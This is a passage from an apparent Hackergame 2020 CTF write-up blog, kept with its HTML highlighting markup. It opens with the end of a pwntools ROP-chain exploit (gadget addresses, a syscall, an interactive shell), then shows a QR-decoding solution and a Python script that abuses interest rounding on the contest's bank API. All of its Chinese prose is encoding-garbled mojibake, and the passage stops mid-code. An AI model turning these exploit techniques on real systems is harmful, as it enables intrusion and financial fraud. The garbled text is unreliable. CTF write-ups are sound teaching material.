<span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000402bf4</span><span class="token punctuation">)</span>  <span class="token comment"># syscall</span>payload <span class="token operator">+=</span> psh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'such as (0,1): '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107011551816.png" alt="flag2"></p><hr><h2 id="æ¥è‡ªæœªæ¥çš„ä¿¡ç¬º"><a href="#æ¥è‡ªæœªæ¥çš„ä¿¡ç¬º" class="headerlink" title="æ¥è‡ªæœªæ¥çš„ä¿¡ç¬º"></a>æ¥è‡ªæœªæ¥çš„ä¿¡ç¬º</h2><p><em>ï¼ˆå¤ç°ï¼‰</em></p><blockquote><p>ä½ æ”¶åˆ°äº†ä¸€å°é‚®ä»¶ã€‚æ²¡æœ‰æ ‡é¢˜ï¼Œå¥‡å¥‡æ€ªæ€ªçš„å‘ä»¶äººï¼Œå’Œä¸€ä»½å¥‡æ€ªçš„é™„ä»¶ã€‚æ—¥æœŸæ˜¾ç¤ºçš„æ˜¯ 3020 å¹´ 10 æœˆ 31 æ—¥ã€‚</p><p>â€œSend from Arctic.â€ æ­£æ–‡å°±åªæœ‰è¿™ä¸€å¥è¯ã€‚</p><p>ã€Œè°æçš„æ¶ä½œå‰§å•Šâ€¦â€¦è¯è¯´è¿™ç«Ÿç„¶æ²¡æœ‰è¢«åƒåœ¾é‚®ä»¶è¿‡æ»¤å™¨è¿‡æ»¤æ‰ï¼Ÿã€ä½ ä¸€è¾¹å˜Ÿå›”ç€ä¸€è¾¹è§£å‹äº†é™„ä»¶â€”â€”åªçœ‹åˆ°ä¸€å †äºŒç»´ç å›¾ç‰‡ã€‚</p><p>çœ‹èµ·æ¥æœ‰ç‚¹æ„æ€ã€‚ä½ ä¸ç¦æƒ³è¯•è¯•ï¼Œèƒ½å¦ä»å…¶ä¸­å¾—åˆ°ä»€ä¹ˆæœ‰æ„ä¹‰çš„ä¸œè¥¿ã€‚</p></blockquote><p>è¿™é¢˜åšçš„æ—¶å€™å·²ç»æƒ³åˆ°æ˜¯ <a href="https://archiveprogram.github.com/">GitHub Archive Program</a> äº†ï¼Œä½†æ²¡æƒ³åˆ°çœŸå°±æ•´äº†ä¸€é¢˜ã€‚</p><p>ä¸€å †äºŒç»´ç ã€‚ç¬¬ä¸€å¼ å‡ºæ¥æ˜¯ä¸ª <code>META</code>.</p><p>å‰å‡ å¼ äºŒç»´ç é‡Œæœ‰ä¸€å¼ å†…å®¹æ˜¯ GitHub çš„ API åˆ—è¡¨ã€‚å¯¹åº”çš„ä»“åº“æ˜¯ openlug/nonexistã€‚</p><p>ç„¶åæˆ‘çœŸå»æ‰¾äº†ï¼Œå‘ç°æ²¡æœ‰ï¼Œä¸€ç§å¯èƒ½æ˜¯ Private Repoï¼Œå¯èƒ½ä¹‹å‰æœ‰è¿‡ Publicï¼Ÿ</p><p>äºæ˜¯å»æ‰¾äº†ä¸€äº›å…¬å¼€çš„ GitHub Archive ç½‘ç«™ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ã€‚</p><p>å¦ä¸€ç§å¯èƒ½å°±æ˜¯å‡çš„äº†ï¼ŒçœŸä¸å­˜åœ¨ã€‚</p><p>ä¸ç®¡äº†å…ˆæŠŠæ‰€æœ‰çš„äºŒç»´ç ç»™è§£ç å‡ºæ¥ï¼Œåˆå¹¶åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œã€‚</p><p>æ¯”èµ›åšé¢˜çš„æ—¶å€™ç”¨çš„ Python çš„ <code>pyzbar</code> åº“ï¼Œè¿˜ç‰¹åœ°æ³¨æ„äº†ç”¨ <code>rb</code> ä»¥äºŒè¿›åˆ¶æ¥å†™å…¥æ–‡ä»¶ï¼Œç„¶è€Œå‡ºæ¥çš„æ–‡ä»¶å•¥ä¹Ÿä¸æ˜¯â€¦â€¦å•¥æ–‡ä»¶å¤´éƒ½æ‰¾ä¸åˆ°ï¼Œå°±ç¦»è°±ã€‚</p><p>æ¯”èµ›ç»“æŸäº†æ‰çŸ¥é“æ˜¯è¿™ä¸ªè§£æåº“æœ¬èº«å­˜åœ¨é—®é¢˜ï¼Œåœ¨ <code>\x00</code> å¤„ä¼šæˆªæ–­ã€‚</p><p>å‚è€ƒå®˜æ–¹ WP ä»¥åŠ æ€»æ¦œ rk1 å¤§å¸ˆå‚…çš„ WPï¼Œå¯ä»¥ç”¨ <a href="https://github.com/mchehab/zbar/tree/master">zbarimg</a> è¿™ä¸ªå‘½ä»¤è¡Œå·¥å…·æ¥è§£ç ã€‚</p><p><del>ï¼ˆè„è¯ä¸€å †ï¼Œåˆ«é—®ï¼Œé—®å°±æ˜¯è£… zbarimg å¿ƒæ€ç‚¸äº†</del></p><p>è¿™é‡Œå°±ç”¨ Python è°ƒç”¨å‘½ä»¤è¡Œæ¥æ‰§è¡Œå¥½äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> osfile_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token string">'./frames'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">for</span> f <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>    fi <span class="token operator">=</span> <span class="token string">'./frames/'</span> <span class="token operator">+</span> f    cmd <span class="token operator">=</span> <span class="token string">'zbarimg --raw -Sbinary %s &gt;&gt; frames.tar'</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd <span class="token operator">%</span> fi<span class="token punctuation">)</span></code></pre><p>ç„¶åè¿™ä¸ªå‡ºæ¥çš„ <code>frames.tar</code> æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å†è§£å‹å°±èƒ½æ‹¿åˆ° flag äº†ã€‚</p><blockquote><p>BTW, æ¯”èµ›ç»“æŸæ‰çŸ¥é“é‚£ä¸ª META å…¶å®å¹¶ä¸æ˜¯ä¸ª Private Repoï¼Œè€Œæ˜¯ openlug/django-commonï¼Œå°±å»å¹´ hackergame çš„ä¸€é“é¢˜ã€‚ã€‚</p></blockquote><hr><h2 id="ç‹—ç‹—é“¶è¡Œ"><a href="#ç‹—ç‹—é“¶è¡Œ" class="headerlink" title="ç‹—ç‹—é“¶è¡Œ"></a>ç‹—ç‹—é“¶è¡Œ</h2><p>è¿™é¢˜ä¹Ÿæœ‰ç‚¹æ„æ€ã€‚</p><p><strong>å››èˆäº”å…¥è–…ç¾Šæ¯›å¤§æ³•</strong>å¥½å•Šã€‚ï¼ˆå½“ç„¶è¿™ä¹Ÿæ˜¯ä¸€ç§å¯è¡Œæ–¹æ¡ˆå•¦ï¼‰</p><p><strong>å‚¨è“„å¡ åˆ©ç‡æ¯æ—¥ 0.3%</strong></p><p>å› æ­¤ äº”å…¥ æœ€å°‘éœ€è¦ 0.5/0.003=167ã€‚</p><p><strong>ä¿¡ç”¨å¡ åˆ©ç‡æ¯æ—¥ 0.5%ï¼Œæœ€ä½ 10</strong></p><p>æœ€åˆ’ç®—çš„è¯æ˜¯ 10/0.005=2000ï¼Œä¸”æ¬ æ¬¾åœ¨ 2000 åˆ° 2100 ä¹‹é—´æ¯æ—¥åˆ©æ¯éƒ½æ˜¯10ã€‚</p><p>æŠŠæ¬ æ¬¾æ§åˆ¶åœ¨è¿™ä¸ªèŒƒå›´å†…å°±èƒ½è–…ç¾Šæ¯›äº†ã€‚</p><p>2000/167 =&gt; 12 å€Ÿæ¬¾åˆ†åˆ°12å¼ å‚¨è“„å¡ä¸­ã€‚</p><p>é¦–å…ˆå¼€6å¼ ä¿¡ç”¨å¡ï¼Œå¼€12*6å¼ å‚¨è“„å¡ï¼Œä¸”ä¾æ¬¡è½¬è´¦åˆ°å‚¨è“„å¡ï¼Œæ¯å¼ å¡167ï¼Œç¡®ä¿æ¯å¤©æœ‰1çš„åˆ©æ¯ã€‚</p><p>é¦–å…ˆç”¨åˆå§‹çš„å‚¨è“„å¡1000å…ƒåƒé¥­ï¼Œç­‰å‚¨è“„å¡ä½™é¢ &gt;= 177 çš„æ—¶å€™å°±èƒ½ç”¨å‚¨è“„å¡è¿˜æ¬¾+åƒé¥­äº†ã€‚</p><p>æœ€å¼€å§‹ç‚¹çš„æ‰‹ç´¯æ­»äº†ï¼Œæƒ³æƒ³ç®—äº†å†™è„šæœ¬å§ã€‚</p><p>é¦–å…ˆæŠŠå„ä¸ªæ–¹æ³•å°è£…å¥½ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""Hackergame 2020ç‹—ç‹—é“¶è¡Œ@Author: MiaoTony@Time: 20201102"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonurl_prefix <span class="token operator">=</span> <span class="token string">r'http://202.38.93.111:10100/api/'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"202.38.93.111:10100"</span><span class="token punctuation">,</span>    <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://202.38.93.111:10100"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://202.38.93.111:10100/"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"</span><span class="token punctuation">,</span>    <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span class="token punctuation">,</span>    <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span>    <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">,</span>    <span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span>    <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"Bearer &lt;your_token&gt;"</span><span class="token punctuation">,</span>    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> headers<span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span>kind<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    åŠå¡     :param kind: {str} `credit`ä¿¡ç”¨å¡ï¼Œ`debit`å‚¨è“„å¡    """</span>    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'create'</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span> kind<span class="token punctuation">}</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text<span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    è·å–ç”¨æˆ·ä¿¡æ¯    """</span>    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'user'</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token comment"># print(r.json())</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_balance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    è·å–å‡€èµ„äº§    """</span>    info <span class="token operator">=</span> get_info<span class="token punctuation">(</span><span class="token punctuation">)</span>    accounts <span class="token operator">=</span> info<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'accounts'</span><span class="token punctuation">)</span>    balance <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> account <span class="token keyword">in</span> accounts<span class="token punctuation">:</span>        <span class="token keyword">if</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'debit'</span><span class="token punctuation">:</span>            balance <span class="token operator">+=</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'balance'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'credit'</span><span class="token punctuation">:</span>            balance <span class="token operator">-=</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'balance'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> balance<span class="token keyword">def</span> <span class="token function">get_debt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    è·å–æ¬ æ¬¾    """</span>    info <span class="token operator">=</span> get_info<span class="token punctuation">(</span><span class="token punctuation">)</span>    accounts <span class="token operator">=</span> info<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'accounts'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> account <span class="token keyword">in</span> accounts<span class="token punctuation">:</span>        <span class="token keyword">if</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'credit'</span><span class="token punctuation">:</span>            debt <span class="token operator">=</span> account<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'balance'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> debt<span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    è½¬è´¦    """</span>    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'transfer'</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"src"</span><span class="token punctuation">:</span> src<span class="token punctuation">,</span> <span class="token string">"dst"</span><span class="token punctuation">:</span> dst<span class="token punctuation">,</span> <span class="token string">"amount"</span><span class="token punctuation">:</span> amount<span class="token punctuation">}</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text<span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    åƒé¥­    """</span>    url <span class="token operator">=</span> url_prefix <span class="token operator">+</span> <span class="token string">'eat'</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"account"</span><span class="token punctuation">:</span> account<span class="token punctuation">}</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text</code></pre><p>åŠå¡ã€è½¬è´¦ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># å…ˆåŠå¡ 1å‚¨è“„å¡ 2-7ä¿¡ç”¨å¡ 8-79å‚¨è“„å¡</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    create_card<span class="token punctuation">(</span><span class="token string">'credit'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    create_card<span class="token punctuation">(</span><span class="token string">'debit'</span><span class="token punctuation">)</span>info <span class="token operator">=</span> get_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># è½¬è´¦ï¼Œæ¯å¼ å¡è½¬167</span><span class="token keyword">for</span> credit_id <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>credit_id<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dst <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> <span class="token punctuation">(</span>credit_id<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> i        amount <span class="token operator">=</span> <span class="token number">167</span>        transfer<span class="token punctuation">(</span>src<span class="token operator">=</span>credit_id<span class="token punctuation">,</span> dst<span class="token operator">=</span>dst<span class="token punctuation">,</span> amount<span class="token operator">=</span>amount<span class="token punctuation">)</span></code></pre><p>æœ€åæ˜¯æ¯å¤©ç¨³å®šèµš2ç‹—å¸ï¼Œå†™ä¸ªå¾ªç¯ã€‚</p><p>å½“æ¬ æ¬¾åˆ°äº†2104æ—¶ä¾æ¬¡ç”¨å‚¨è“„å¡è¿˜æ¬¾ï¼Œä¸€ç›´è¿˜åˆ°2004ï¼Œå¦åˆ™å°±æ¯å¤©æ°é¥­é¡ºä¾¿è–…ç¾Šæ¯›ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">debit_card_id <span class="token operator">=</span> <span class="token number">8</span>   <span class="token comment"># å‚¨è“„å¡</span>credit_card_id <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># ä¿¡ç”¨å¡</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    debt <span class="token operator">=</span> get_debt<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> get_debt<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2104</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token comment"># ä¾æ¬¡ç”¨åé¢çš„å‚¨è“„å¡ç»™ä¿¡ç”¨å¡è¿˜æ¬¾</span>            transfer<span class="token punctuation">(</span>debit_card_id<span class="token punctuation">,</span> credit_card_id<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>            debit_card_id <span class="token operator">+=</span> <span class="token 